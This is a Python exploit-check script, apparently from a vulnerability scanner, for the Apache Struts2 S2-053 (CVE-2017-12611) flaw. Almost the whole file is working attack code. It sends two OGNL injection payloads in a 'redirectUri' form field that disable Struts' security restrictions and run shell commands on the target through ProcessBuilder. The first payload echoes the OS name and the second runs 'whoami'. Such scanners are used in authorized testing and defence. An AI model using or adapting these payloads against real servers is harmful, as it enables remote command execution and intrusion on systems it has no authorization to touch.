#!/usr/bin/env python3

'''
name: Struts2 S2-053漏洞，又名CVE-2017-12611漏洞
description: Struts2 S2-053漏洞可执行任意命令
'''

import re
from app.lib.utils.request import request


class S2_053_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Content-Type': "application/x-www-form-urlencoded",
                  }
        self.check_payload = {
                    'redirectUri':'''%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wincmd='echo OS:Windows',#linuxcmd='echo OS:Linux').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#wincmd}:{'/bin/bash','-c',#linuxcmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n'''
                    }
        self.cmd_payload = {
                    'redirectUri':'''%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wincmd='whoami',#linuxcmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#wincmd}:{'/bin/bash','-c',#linuxcmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n'''
                    }

    def check_count(self, mom_str, sub_str):
        count = 0
        for i in range(len(mom_str)-1): 
            if mom_str[i:i+len(sub_str)] == sub_str:
                count+=1
        return count

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/hello.action'
        try:
            check_req = request.post(self.url, headers = self.headers, data = self.check_payload)
            print()
            if check_req.status_code == 200:
                if self.check_count(check_req.text, 'OS:Linux') == 2:
                    cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
                    cmd_str = re.sub('\n', '', cmd_req.text)
                    result = re.findall('<p>Your url:(.*?)</p>', cmd_str)
                    print('存在S2-053漏洞,OS为Linux,执行whoami命令成功，其结果为:', result)
                    return True
                if self.check_count(check_req.text, 'OS:Windows') == 2:
                    cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
                    cmd_str = re.sub('\n', '', cmd_req.text)
                    result = re.findall('<p>Your url:(.*?)</p>', cmd_str)
                    print('存在S2-053漏洞,OS为Windows,执行whoami命令成功，其结果为:', result)
                    return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_053 = S2_053_BaseVerify('http://192.168.30.242:8080')
    S2_053.run()


